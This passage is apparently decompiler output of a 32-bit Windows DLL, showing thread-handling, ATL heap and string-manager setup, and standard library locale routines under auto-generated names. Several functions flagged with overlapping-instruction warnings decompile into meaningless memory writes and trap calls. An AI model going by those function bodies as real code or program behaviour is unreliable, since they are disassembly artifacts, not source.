    FUN_10007de0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    FUN_10057b51(FUN_10078270);
  }
  local_8 = 0xffffffff;
  iVar1 = **(int **)(param_1 + 4);
  while ((iVar1 == 0 && (*(int *)(param_1 + 8) == 0))) {
    FUN_10007c50(&local_1c);
    local_8 = 1;
    if (local_1c != (int *)0x0) {
      (*(code *)local_1c[2])(local_1c[3] + *local_1c,local_18);
    }
    local_8 = 0xffffffff;
    thunk_FUN_100579ee(local_1c);
    local_1c = (int *)0x0;
    iVar1 = **(int **)(param_1 + 4);
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_100077d0 */

void __fastcall FUN_100077d0(undefined4 *param_1)

{
  thunk_FUN_100579ee(*param_1);
  *param_1 = 0;
  return;
}



/* Function: FUN_100077f0 */

undefined4 __fastcall FUN_100077f0(int param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  code *unaff_EBX;
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007408e;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_100079a0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  iVar5 = DAT_1009ac9c;
  *(undefined4 *)(param_1 + 8) = 0;
  if (iVar5 < 10) {
    uVar2 = FUN_10007b60(&DAT_100834c0,0xffffffff);
    *(undefined4 *)(param_1 + 0x14) = uVar2;
    iVar5 = DAT_1009ac9c;
  }
  DAT_1009ac9c = iVar5 + 1;
  uVar2 = FUN_10007280(iVar5,DAT_1009ac9c);
  *(undefined4 *)(param_1 + 0x14) = uVar2;
  puVar3 = (undefined4 *)FUN_10058463(0x18,&DAT_10098020);
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    if (*(int *)(param_1 + 0x14) == 0) {
      iVar5 = 0;
    }
    else {
      iVar5 = *(int *)(param_1 + 0x14) + 0xc;
    }
    *puVar3 = CLMIThread::vftable;
    puVar3[4] = iVar5;
    puVar3[1] = FUN_100076e0;
    puVar3[2] = param_1;
    puVar3[3] = 0;
    puVar3[5] = 0;
  }
  *(undefined4 **)(param_1 + 0xc) = puVar3;
  if (puVar3 != (undefined4 *)0x0) {
    if ((DAT_1009b35c & 1) == 0) {
      DAT_1009b35c = DAT_1009b35c | 1;
      local_8 = 0;
      FUN_10006ca0(0);
      FUN_10057b51(FUN_100781b0);
      local_8 = 0xffffffff;
    }
    iVar5 = *(int *)(param_1 + 0xc);
    local_14 = 0;
    iVar4 = FUN_10058b59(0,0,FUN_1004a430,iVar5,0,&local_14);
    *(int *)(iVar5 + 0x14) = iVar4;
    if (iVar4 != 0) {
      *(undefined4 *)(iVar5 + 0xc) = local_14;
    }
    pcVar1 = DAT_10079310;
    uVar2 = (*DAT_10079310)(1);
    FUN_10211370(uVar2);
    iVar4 = (*unaff_EBX)();
    iVar5 = *(int *)(*(int *)(param_1 + 0xc) + 0xc);
    *(int *)(param_1 + 0x10) = iVar5;
    while ((iVar5 == 0 && (iVar5 = (*unaff_EBX)(), (uint)(iVar5 - iVar4) < 0x3e9))) {
      (*pcVar1)(1);
      iVar5 = *(int *)(*(int *)(param_1 + 0xc) + 0xc);
      *(int *)(param_1 + 0x10) = iVar5;
    }
    if (*(int *)(param_1 + 0x10) != 0) {
      FUN_10006980(*(int *)(param_1 + 0x10),*(undefined4 *)(param_1 + 0xc),param_1 + 0x14);
    }
    ExceptionList = local_10;
    return 1;
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_100079a0 */

/* WARNING: Instruction at (ram,0x100079f7) overlaps instruction at (ram,0x100079f6)
    */

undefined4 __fastcall FUN_100079a0(int *param_1)

{
  uint uVar1;
  int *piVar2;
  char *pcVar3;
  int extraout_ECX;
  char extraout_DH;
  int unaff_EBX;
  int unaff_EBP;
  byte bVar4;
  
  if (param_1[4] == 0) {
    return 1;
  }
  param_1[2] = 1;
  (**(code **)(*param_1 + 4))();
  uVar1 = FUN_1024b0ef();
  if (uVar1 != 0) {
    bVar4 = uVar1 < 0x102;
    if (uVar1 == 0x102) goto LAB_10007a0e;
    piVar2 = (int *)FUN_102c9733();
    *(int *)(unaff_EBP + -0x47f88a40) =
         (*(int *)(unaff_EBP + -0x47f88a40) - (int)piVar2) - (uint)bVar4;
    pcVar3 = (char *)((int)piVar2 + *piVar2);
    *(int *)(unaff_EBX + 0x73d17eb) = *(int *)(unaff_EBX + 0x73d17eb) + 1;
    *(uint *)(unaff_EBP + 0x3d) = *(uint *)(unaff_EBP + 0x3d) ^ 0xffffff80;
    *pcVar3 = *pcVar3 + (char)pcVar3;
    pcVar3 = (char *)((int)param_1 +
                     CONCAT22((short)((uint)unaff_EBX >> 0x10),
                              CONCAT11((char)((uint)unaff_EBX >> 8) * '\x02',(char)unaff_EBX)) +
                     -0x7d);
    *pcVar3 = *pcVar3 + extraout_DH;
    *(undefined1 *)(extraout_ECX + -0x40000000) = 0;
  }
  param_1[4] = 0;
  param_1[3] = 0;
LAB_10007a0e:
  (**(code **)(*param_1 + 8))();
  return 1;
}



/* Function: FUN_10007a20 */

int __fastcall FUN_10007a20(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007401b;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = CRobotBase::vftable;
  local_8 = 0;
  iVar4 = FUN_100079a0(uVar3);
  piVar2 = (int *)param_1[5];
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    iVar4 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar4 = FUN_100579ee(piVar2);
    }
  }
  ExceptionList = local_10;
  return iVar4;
}



/* Function: FUN_10007a90 */

undefined4 * __thiscall FUN_10007a90(undefined4 *param_1,char *param_2)

{
  undefined4 uVar1;
  
  if ((param_2 != (char *)0x0) && (*param_2 == '\0')) {
    uVar1 = FUN_10007ae0();
    *param_1 = uVar1;
    return param_1;
  }
  uVar1 = FUN_100075b0();
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_10007ad0 */

undefined4 __fastcall FUN_10007ad0(int *param_1)

{
  if (*param_1 != 0) {
    return *(undefined4 *)(*param_1 + 8);
  }
  return 0;
}



/* Function: FUN_10007ae0 */

int * FUN_10007ae0(void)

{
  if ((DAT_1009ac98 & 1) == 0) {
    DAT_1009ac98 = DAT_1009ac98 | 1;
    DAT_1009ac94 = (int *)FUN_100075b0(0);
    if (DAT_1009ac94 != (int *)0x0) {
      DAT_1009ac94[2] = 0;
      *(undefined1 *)(DAT_1009ac94 + 3) = 0;
    }
    FUN_10057b51(&LAB_10078240);
  }
  if (DAT_1009ac94 != (int *)0x0) {
    LOCK();
    *DAT_1009ac94 = *DAT_1009ac94 + 1;
    UNLOCK();
    return DAT_1009ac94;
  }
  return (int *)0x0;
}



/* Function: FUN_10007b60 */

int __thiscall FUN_10007b60(int param_1,char *param_2,int param_3)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  char *pcVar4;
  char *pcVar5;
  char *local_c;
  
  local_c = (char *)0x0;
  if (((param_1 == 0) || (param_2 < (char *)(param_1 + 0xcU))) ||
     ((char *)(*(int *)(param_1 + 4) + 0xc + param_1) <= param_2)) {
    bVar2 = false;
    if (param_3 != -1) goto LAB_10007bd9;
    if (param_2 == (char *)0x0) {
      return param_1;
    }
    pcVar4 = param_2 + 1;
    pcVar5 = param_2;
    do {
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
  }
  else {
    pcVar5 = *(char **)(param_1 + 8);
    pcVar4 = param_2 + (-0xc - param_1);
    bVar2 = true;
    if (pcVar5 < pcVar4) {
      return param_1;
    }
    local_c = pcVar4;
    if ((param_3 != -1) && (pcVar4 + param_3 <= pcVar5)) goto LAB_10007bd9;
  }
  param_3 = (int)pcVar5 - (int)pcVar4;
LAB_10007bd9:
  if (param_3 != 0) {
    if (param_1 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *(int *)(param_1 + 8);
    }
    iVar3 = FUN_100074a0(iVar3 + 1 + param_3,1);
    if (iVar3 != 0) {
      if (bVar2) {
        param_2 = local_c + iVar3 + 0xc;
      }
      FUN_1005d740(*(int *)(iVar3 + 8) + 0xc + iVar3,param_2,param_3);
      *(int *)(iVar3 + 8) = *(int *)(iVar3 + 8) + param_3;
      *(undefined1 *)(*(int *)(iVar3 + 8) + 0xc + iVar3) = 0;
      return iVar3;
    }
  }
  return param_1;
}



/* Function: FUN_10007c50 */

/* WARNING: Instruction at (ram,0x10007c9d) overlaps instruction at (ram,0x10007c9c)
    */

undefined4 * __thiscall FUN_10007c50(int param_1,undefined4 *param_2)

{
  int iVar1;
  int *piVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  int iVar5;
  char *pcVar6;
  undefined4 uVar7;
  int iVar8;
  uint uVar9;
  int extraout_ECX;
  
  iVar1 = param_1 + 0x20;
  if (*(code **)(PTR_DAT_10096f20 + 0x17c) == (code *)0x0) {
    pcVar6 = (char *)FUN_105736f5();
    iVar8 = param_1 + 0x21;
    out(0x5a,(char)pcVar6);
    *(char *)(extraout_ECX + -0x6072e3ba) =
         *(char *)(extraout_ECX + -0x6072e3ba) + (char)extraout_ECX;
    *pcVar6 = *pcVar6 + (char)pcVar6;
  }
  else {
    iVar5 = (**(code **)(PTR_DAT_10096f20 + 0x17c))();
    iVar8 = iVar1;
    if (iVar5 == 0) {
      FUN_1029696d(iVar1);
      *(undefined4 *)(param_1 + 0x38) = 1;
    }
    else {
      *(int *)(param_1 + 0x38) = *(int *)(param_1 + 0x38) + 1;
    }
  }
  uVar7 = FUN_1054d78b(&stack0xfffffffc);
  *(undefined4 *)(iVar8 + 0x1c) = uVar7;
  piVar2 = (int *)(param_1 + 0xa8);
  LOCK();
  iVar5 = *piVar2;
  if (iVar5 == -1) {
    *piVar2 = *piVar2;
    iVar5 = -1;
  }
  UNLOCK();
  while( true ) {
    if (0 < iVar5) {
      iVar8 = *(int *)(param_1 + 0x44) + 6;
      uVar7 = *(undefined4 *)(param_1 + iVar8 * 0xc);
      *(undefined4 *)(param_1 + iVar8 * 0xc) = 0;
      uVar3 = *(undefined4 *)(param_1 + 4 + iVar8 * 0xc);
      uVar4 = *(undefined4 *)(param_1 + 8 + iVar8 * 0xc);
      uVar9 = *(int *)(param_1 + 0x44) + 1U & 0x80000007;
      if ((int)uVar9 < 0) {
        uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;
      }
      *(uint *)(param_1 + 0x44) = uVar9;
      LOCK();
      *piVar2 = *piVar2 + -1;
      UNLOCK();
      *param_2 = uVar7;
      param_2[1] = uVar3;
      param_2[2] = uVar4;
      thunk_FUN_100579ee(0);
      *(int *)(param_1 + 0x38) = *(int *)(param_1 + 0x38) + -1;
      if (*(int *)(param_1 + 0x38) == 0) {
        *(undefined4 *)(param_1 + 0x3c) = 0;
      }
      (*DAT_100792fc)(iVar1);
      return param_2;
    }
    if (*(int *)(param_1 + 0xac) != 0) break;
    (*DAT_10079310)(1);
    LOCK();
    iVar5 = *piVar2;
    if (iVar5 == -1) {
      *piVar2 = *piVar2;
      iVar5 = -1;
    }
    UNLOCK();
  }
  *param_2 = 0;
  param_2[1] = 0;
  param_2[2] = 0;
  thunk_FUN_100579ee(0);
  *(int *)(iVar8 + 0x18) = *(int *)(iVar8 + 0x18) + -1;
  if (*(int *)(iVar8 + 0x18) == 0) {
    *(undefined4 *)(iVar8 + 0x1c) = 0;
  }
  (*DAT_100792fc)(iVar8);
  return param_2;
}



/* Function: FUN_10007de0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * FUN_10007de0(void)

{
  char cVar1;
  byte bVar2;
  code *pcVar3;
  byte extraout_CH;
  byte extraout_CH_00;
  undefined4 unaff_EBX;
  char *pcVar4;
  int unaff_EDI;
  undefined8 uVar5;
  byte in_stack_680c74bc;
  void *local_10;
  undefined1 *puStack_c;
  uint *local_8;
  
  local_8 = (uint *)0xffffffff;
  puStack_c = &LAB_100740f3;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  uVar5 = FUN_104dd82e(&DAT_1009b390,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  bVar2 = (byte)uVar5;
  *(byte *)(unaff_EDI + 9) = *(byte *)(unaff_EDI + 9) & extraout_CH;
  cVar1 = DAT_6800000f;
  _DAT_1009b3ac =
       (uint *)CONCAT31((int3)(CONCAT22((short)((ulonglong)uVar5 >> 0x10),
                                        CONCAT11(bVar2 / 0xa1,bVar2)) >> 8),DAT_6800000f);
  pcVar4 = (char *)CONCAT22((short)((uint)unaff_EBX >> 0x10),
                            CONCAT11((char)((uint)unaff_EBX >> 8) * '\x02' +
                                     CARRY1(in_stack_680c74bc,bVar2 % 0xa1),9));
  *pcVar4 = *pcVar4 << 1;
  *_DAT_1009b3ac = *_DAT_1009b3ac | (uint)((ulonglong)uVar5 >> 0x20);
  *(char *)_DAT_1009b3ac = (char)*_DAT_1009b3ac + cVar1;
  *(char *)_DAT_1009b3ac = (char)*_DAT_1009b3ac + cVar1;
  local_8 = _DAT_1009b3ac;
  uVar5 = FUN_104af93b(&DAT_1009b3b0);
  *(byte *)(unaff_EDI + 9) = *(byte *)(unaff_EDI + 9) & extraout_CH_00;
  pcVar3 = (code *)CONCAT31((int3)((ulonglong)uVar5 >> 8),0xb3);
  *(uint *)pcVar3 = *(uint *)pcVar3 | (uint)((ulonglong)uVar5 >> 0x20);
  (*pcVar3)();
  _DAT_1009b3c8 = 0;
  _DAT_1009b3cc = 0;
  local_8 = (uint *)CONCAT31(local_8._1_3_,1);
  _DAT_1009b3d0 = 0;
  _DAT_1009b3d4 = 0;
  FUN_1005849f(&DAT_1009b3d8,0xc,8,&LAB_10007dc0,FUN_100077d0);
  _DAT_1009b438 = 0;
  _DAT_1009b43c = 0;
  ExceptionList = local_10;
  return &DAT_1009b390;
}



/* Function: FUN_10007ee0 */

undefined4 __thiscall FUN_10007ee0(undefined4 param_1,byte param_2)

{
  FUN_1005859b();
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10007f20 */

void FUN_10007f20(undefined4 param_1)

{
  code *pcVar1;
  
  FUN_1005de1b(&param_1,&DAT_100930d4);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10007f40 */

undefined4 FUN_10007f40(undefined4 param_1)

{
  byte bVar1;
  code *pcVar2;
  byte *pbVar3;
  undefined4 uVar4;
  byte extraout_DL;
  char extraout_DH;
  int *unaff_EBX;
  int iVar5;
  
  switch(param_1) {
  case 0:
  case 0x50:
    return param_1;
  case 0xc:
    FUN_10007f20(0x8007000e);
  case 0x16:
  case 0x22:
    FUN_10007f20(0x80070057);
  default:
    iVar5 = -0x7fffbffb;
    pbVar3 = (byte *)FUN_10007f20();
    bVar1 = *pbVar3;
    *pbVar3 = *pbVar3 + extraout_DL;
    *(char *)(iVar5 + 0x7f) = *(char *)(iVar5 + 0x7f) + extraout_DH + CARRY1(bVar1,extraout_DL);
    *pbVar3 = *pbVar3 + extraout_DL;
    *(char *)unaff_EBX = (char)*unaff_EBX + (char)pbVar3;
    *unaff_EBX = (int)(pbVar3 + *unaff_EBX +
                                *unaff_EBX + *unaff_EBX + *unaff_EBX + *unaff_EBX + *unaff_EBX);
    pcVar2 = (code *)swi(3);
    uVar4 = (*pcVar2)();
    return uVar4;
  }
}



/* Function: FUN_10007fe0 */

void __fastcall FUN_10007fe0(undefined4 *param_1)

{
  code *pcVar1;
  int extraout_ECX;
  char in_ZF;
  
  FUN_1015ed9d(*param_1);
  if (extraout_ECX == 1 || in_ZF == '\0') {
    pcVar1 = (code *)swi(3);
    (*pcVar1)();
    return;
  }
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10008000 */

void __thiscall FUN_10008000(int param_1,undefined4 param_2)

{
  undefined4 unaff_EBP;
  
  FUN_1014328f(*(undefined4 *)(param_1 + 4),0,param_2,unaff_EBP);
  return;
}



/* Function: FUN_10008020 */

void __thiscall FUN_10008020(int param_1,int param_2)

{
  if (param_2 != 0) {
    FUN_10472b1c(*(undefined4 *)(param_1 + 4),0,param_2);
  }
  return;
}



/* Function: FUN_10008040 */

undefined4 __thiscall FUN_10008040(int *param_1,int param_2,int param_3)

{
  code *pcVar1;
  undefined4 uVar2;
  byte *pbVar3;
  
  if (param_2 == 0) {
    uVar2 = (**(code **)*param_1)(param_3);
    return uVar2;
  }
  if (param_3 == 0) {
    (**(code **)(*param_1 + 4))(param_2);
    return 0;
  }
  pbVar3 = (byte *)FUN_100b49f1(param_1[1],0,param_2,param_3);
  *pbVar3 = *pbVar3 | (byte)pbVar3;
  pcVar1 = (code *)swi(3);
  uVar2 = (*pcVar1)();
  return uVar2;
}



/* Function: FUN_10008080 */

void FUN_10008080(void)

{
  undefined4 in_EAX;
  
  FUN_102334a8(in_EAX);
  return;
}



/* Function: FUN_100080a0 */

undefined4 * __thiscall FUN_100080a0(undefined4 *param_1,byte param_2)

{
  int iVar1;
  
  *param_1 = ATL::CWin32Heap::vftable;
  if ((*(char *)(param_1 + 2) != '\0') && (iVar1 = param_1[1], iVar1 != 0)) {
    FUN_1035c799(iVar1,iVar1);
  }
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_100080e0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined * FUN_100080e0(void)

{
  int *unaff_EDI;
  
  if ((DAT_1009ad08 & 1) == 0) {
    DAT_1009ad08 = DAT_1009ad08 | 1;
    _DAT_1009ad00 = FUN_10474984();
    *unaff_EDI = *unaff_EDI + 0x10;
    _DAT_1009acfc = ATL::CWin32Heap::vftable;
    DAT_1009ad04 = 0;
    FUN_10057b51();
  }
  if ((DAT_1009ad08 & 2) == 0) {
    DAT_1009ad08 = DAT_1009ad08 | 2;
    _DAT_1009ace0 = ATL::CAtlStringMgr::vftable;
    _DAT_1009ace4 = &DAT_1009acfc;
    _DAT_1009acf4 = 2;
    _DAT_1009acec = 0;
    _DAT_1009acf0 = 0;
    _DAT_1009acf8 = 0;
    _DAT_1009ace8 = &DAT_1009ace0;
    FUN_10057b51(&LAB_100782e0);
  }
  return &DAT_1009ace0;
}



/* Function: FUN_10008190 */

int * __thiscall FUN_10008190(int param_1,int param_2,uint param_3)

{
  uint uVar1;
  int *piVar2;
  uint uVar3;
  
  if ((param_2 < 0) || (0x7fffffff - param_2 < 1)) {
    return (int *)0x0;
  }
  uVar3 = param_2 + 8U & 0xfffffff8;
  if ((param_2 + 1 <= (int)uVar3) &&
     (((uVar1 = (uint)((ulonglong)uVar3 * (ulonglong)param_3),
       (int)((ulonglong)uVar3 * (ulonglong)param_3 >> 0x20) == 0 && (uVar1 < 0xfffffff0)) &&
      (piVar2 = (int *)(**(code **)**(undefined4 **)(param_1 + 4))(uVar1 + 0x10),
      piVar2 != (int *)0x0)))) {
    *piVar2 = param_1;
    piVar2[2] = uVar3 - 1;
    piVar2[3] = 1;
    piVar2[1] = 0;
    return piVar2;
  }
  return (int *)0x0;
}



/* Function: FUN_10008210 */

void __fastcall FUN_10008210(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x10008219. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (**(code **)(**(int **)(param_1 + 4) + 4))();
  return;
}



/* Function: FUN_10008220 */

int __thiscall FUN_10008220(int param_1,undefined4 param_2,int param_3,uint param_4)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  
  if ((param_3 < 0) || (0x7fffffff - param_3 < 1)) {
    return 0;
  }
  uVar3 = param_3 + 8U & 0xfffffff8;
  if ((param_3 + 1 <= (int)uVar3) &&
     (((uVar1 = (uint)((ulonglong)uVar3 * (ulonglong)param_4),
       (int)((ulonglong)uVar3 * (ulonglong)param_4 >> 0x20) == 0 && (uVar1 < 0xfffffff0)) &&
      (iVar2 = (**(code **)(**(int **)(param_1 + 4) + 8))(param_2,uVar1 + 0x10), iVar2 != 0)))) {
    *(uint *)(iVar2 + 8) = uVar3 - 1;
    return iVar2;
  }
  return 0;
}



/* Function: FUN_10008290 */

undefined8 __fastcall FUN_10008290(int param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(param_1 + 0x14);
  LOCK();
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + 1;
  UNLOCK();
  return CONCAT44(iVar2,param_1 + 8);
}



/* Function: FUN_100082a0 */

undefined4 * __thiscall FUN_100082a0(undefined4 *param_1,byte param_2)

{
  DAT_1009b440 = 0;
  *param_1 = ATL::CAtlStringMgr::vftable;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_100082d0 */

_Lockit * __thiscall FUN_100082d0(_Lockit *param_1,char *param_2)

{
  char *pcVar1;
  undefined **local_20 [3];
  _Lockit *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007415a;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_14 = param_1;
  std::_Lockit::_Lockit(param_1,0);
  *(undefined4 *)(param_1 + 4) = 0;
  param_1[8] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  param_1[0x10] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0x14) = 0;
  *(undefined2 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  *(undefined2 *)(param_1 + 0x20) = 0;
  *(undefined4 *)(param_1 + 0x24) = 0;
  param_1[0x28] = (_Lockit)0x0;
  *(undefined4 *)(param_1 + 0x2c) = 0;
  param_1[0x30] = (_Lockit)0x0;
  local_8 = 6;
  pcVar1 = param_2;
  if (param_2 == (char *)0x0) {
    param_2 = "bad locale name";
    std::exception::exception((exception *)local_20,&param_2);
    local_20[0] = std::runtime_error::vftable;
    pcVar1 = (char *)FUN_1005de1b(local_20,&DAT_100930a0);
  }
  std::_Locinfo::_Locinfo_ctor((_Locinfo *)param_1,pcVar1);
  ExceptionList = local_10;
  return param_1;
}



/* Function: ~_Locinfo */

/* Library Function - Single Match
    public: __thiscall std::_Locinfo::~_Locinfo(void)
   
   Library: Visual Studio 2019 Release */

void __thiscall std::_Locinfo::~_Locinfo(_Locinfo *this)

{
  _Locinfo_dtor(this);
  if (*(int *)(this + 0x2c) != 0) {
    FUN_100579ee(*(int *)(this + 0x2c));
  }
  *(undefined4 *)(this + 0x2c) = 0;
  if (*(int *)(this + 0x24) != 0) {
    FUN_100579ee(*(int *)(this + 0x24));
  }
  *(undefined4 *)(this + 0x24) = 0;
  if (*(int *)(this + 0x1c) != 0) {
    FUN_100579ee(*(int *)(this + 0x1c));
  }
  *(undefined4 *)(this + 0x1c) = 0;
  if (*(int *)(this + 0x14) != 0) {
    FUN_100579ee(*(int *)(this + 0x14));
  }
  *(undefined4 *)(this + 0x14) = 0;
  if (*(int *)(this + 0xc) != 0) {
    FUN_100579ee(*(int *)(this + 0xc));
  }
  *(undefined4 *)(this + 0xc) = 0;
  if (*(int *)(this + 4) != 0) {
    FUN_100579ee(*(int *)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  _Lockit::~_Lockit((_Lockit *)this);
  return;
}



/* Function: FUN_10008430 */

exception * __thiscall FUN_10008430(exception *param_1,exception *param_2)

{
  std::exception::exception(param_1,param_2);
  *(undefined ***)param_1 = std::runtime_error::vftable;
  return param_1;
}



/* Function: FUN_10008450 */

undefined4 * __thiscall FUN_10008450(undefined4 *param_1,byte param_2)

{
  *param_1 = std::_Facet_base::vftable;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10008480 */

int __fastcall FUN_10008480(int param_1)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = (int *)(param_1 + 4);
  LOCK();
  iVar1 = *piVar2;
  *piVar2 = *piVar2 + 1;
  UNLOCK();
  return iVar1;
}



/* Function: FUN_10008490 */

undefined8 __fastcall FUN_10008490(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar4;
  int iVar3;
  
  piVar1 = (int *)(param_1 + 4);
  LOCK();
  iVar2 = *piVar1;
  iVar3 = *piVar1;
  *piVar1 = iVar2 + -1;
  UNLOCK();
  iVar4 = 0;
  if (iVar2 + -1 == 0) {
    iVar4 = param_1;
  }
  return CONCAT44(iVar3,iVar4);
}



/* Function: FUN_100084b0 */

void __fastcall FUN_100084b0(int *param_1)

{
  undefined4 *puVar1;
  
  if ((int *)*param_1 != (int *)0x0) {
    puVar1 = (undefined4 *)(**(code **)(*(int *)*param_1 + 8))();
    if (puVar1 != (undefined4 *)0x0) {
      (**(code **)*puVar1)(1);
    }
  }
  return;
}



/* Function: FUN_100084d0 */

undefined4 FUN_100084d0(void)

{
  return 1;
}



/* Function: FUN_100084e0 */

undefined4 FUN_100084e0(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  undefined1 *puVar6;
  undefined4 *puVar7;
  bool bVar8;
  _Locinfo local_58 [52];
  undefined1 local_24 [16];
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007418b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  bVar8 = false;
  local_14 = 0;
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    puVar5 = (undefined4 *)FUN_100582fa(0x18,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    local_8 = 0;
    if (puVar5 == (undefined4 *)0x0) {
      puVar5 = (undefined4 *)0x0;
    }
    else {
      iVar1 = *param_2;
      if (iVar1 == 0) {
        puVar6 = &DAT_10083790;
      }
      else {
        puVar6 = *(undefined1 **)(iVar1 + 0x18);
        if (puVar6 == (undefined1 *)0x0) {
          puVar6 = (undefined1 *)(iVar1 + 0x1c);
        }
      }
      FUN_100082d0(puVar6);
      puVar5[1] = 0;
      bVar8 = true;
      *puVar5 = std::ctype<char>::vftable;
      puVar7 = (undefined4 *)FUN_10056e89(local_24);
      uVar2 = puVar7[1];
      uVar3 = puVar7[2];
      uVar4 = puVar7[3];
      puVar5[2] = *puVar7;
      puVar5[3] = uVar2;
      puVar5[4] = uVar3;
      puVar5[5] = uVar4;
    }
    *param_1 = (int)puVar5;
    if (bVar8) {
      std::_Locinfo::~_Locinfo(local_58);
    }
  }
  ExceptionList = local_10;
  return 2;
}



/* Function: FUN_100085b0 */

void __thiscall FUN_100085b0(int param_1,undefined1 param_2)

{
  FUN_10056ef5(param_2,param_1 + 8);
  return;
}



/* Function: FUN_100085d0 */

undefined1 * __thiscall FUN_100085d0(int param_1,undefined1 *param_2,undefined1 *param_3)

{
  undefined1 uVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = (int)param_3 - (int)param_2;
  iVar3 = 0;
  if (param_3 < param_2) {
    iVar2 = 0;
  }
  if (iVar2 != 0) {
    do {
      uVar1 = FUN_10056ef5(*param_2,param_1 + 8);
      *param_2 = uVar1;
      iVar3 = iVar3 + 1;
      param_2 = param_2 + 1;
    } while (iVar3 != iVar2);
  }
  return param_2;
}



/* Function: FUN_10008620 */

void __thiscall FUN_10008620(int param_1,undefined1 param_2)

{
  FUN_10056ff4(param_2,param_1 + 8);
  return;
}



/* Function: FUN_10008640 */

undefined1 * __thiscall FUN_10008640(int param_1,undefined1 *param_2,undefined1 *param_3)

{
  undefined1 uVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = (int)param_3 - (int)param_2;
  iVar3 = 0;
  if (param_3 < param_2) {
    iVar2 = 0;
  }
  if (iVar2 != 0) {
    do {
      uVar1 = FUN_10056ff4(*param_2,param_1 + 8);
      *param_2 = uVar1;
      iVar3 = iVar3 + 1;
      param_2 = param_2 + 1;
    } while (iVar3 != iVar2);
  }
  return param_2;
}



/* Function: FUN_10008690 */

undefined1 FUN_10008690(undefined1 param_1)

{
  return param_1;
}



/* Function: do_widen */

/* Library Function - Single Match
    protected: virtual char const * __thiscall std::ctype<char>::do_widen(char const *,char const
   *,char *)const 
   
   Library: Visual Studio 2019 Release */

char * __thiscall
std::ctype<char>::do_widen(ctype<char> *this,char *param_1,char *param_2,char *param_3)

{
  FUN_1005d740(param_3,param_1,(int)param_2 - (int)param_1);
  return param_2;
}



/* Function: FUN_100086c0 */

undefined1 FUN_100086c0(undefined1 param_1)

{
  return param_1;
}



/* Function: do_narrow */

/* Library Function - Single Match
    protected: virtual char const * __thiscall std::ctype<char>::do_narrow(char const *,char const
   *,char,char *)const 
   
   Library: Visual Studio 2019 Release */

char * __thiscall
std::ctype<char>::do_narrow
          (ctype<char> *this,char *param_1,char *param_2,char param_3,char *param_4)

{
  FUN_1005d740(param_4,param_1,(int)param_2 - (int)param_1);
  return param_2;
}



/* Function: FUN_100086f0 */

undefined4 * __thiscall FUN_100086f0(undefined4 *param_1,byte param_2)

{
  *param_1 = std::ctype<char>::vftable;
  if ((int)param_1[4] < 1) {
    if ((int)param_1[4] < 0) {
      thunk_FUN_100579ee(param_1[3]);
    }
  }
  else {
    FUN_100579ee(param_1[3]);
  }
  FUN_100579ee(param_1[5]);
  *param_1 = std::_Facet_base::vftable;
